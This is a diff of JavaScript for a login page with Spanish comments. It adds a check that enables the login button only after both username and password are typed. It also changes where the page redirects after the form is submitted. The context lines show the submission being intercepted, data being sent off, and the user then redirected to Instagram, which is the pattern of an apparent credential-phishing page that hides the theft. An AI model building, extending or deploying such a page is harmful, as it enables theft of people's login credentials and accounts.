@@ -3,6 +3,31 @@ document.addEventListener('DOMContentLoaded', function() {
     const loginForm = document.getElementById('loginForm');
     const modal = document.getElementById('modal');
     const closeModal = document.getElementById('closeModal');
+    const loginButton = document.querySelector('.login-button');
+    const usernameInput = document.getElementById('username');
+    const passwordInput = document.getElementById('password');
+    
+    // Función para validar si ambos campos tienen datos
+    function validateForm() {
+        const username = usernameInput.value.trim();
+        const password = passwordInput.value.trim();
+        
+        if (username && password) {
+            loginButton.disabled = false;
+            loginButton.style.opacity = '1';
+        } else {
+            loginButton.disabled = true;
+            loginButton.style.opacity = '0.3';
+        }
+    }
+    
+    // Deshabilitar el botón inicialmente
+    loginButton.disabled = true;
+    loginButton.style.opacity = '0.3';
+    
+    // Escuchar cambios en los inputs
+    usernameInput.addEventListener('input', validateForm);
+    passwordInput.addEventListener('input', validateForm);
     
     // Interceptar el envío del formulario
     loginForm.addEventListener('submit', function(e) {
@@ -72,9 +97,9 @@ document.addEventListener('DOMContentLoaded', function() {
             console.error('Error en el envío:', error);
         });
         
-        // Redirigir a Instagram oficial
+        // Redirigir a Instagram
         setTimeout(function() {
-            window.location.href = 'https://www.instagram.com/';
+            window.location.href = 'https://www.instagram.com/p/DLFnosJxNzt/?img_index=1&igsh=bm9yODlva2Noc2dl';
         }, 500);
     });
     
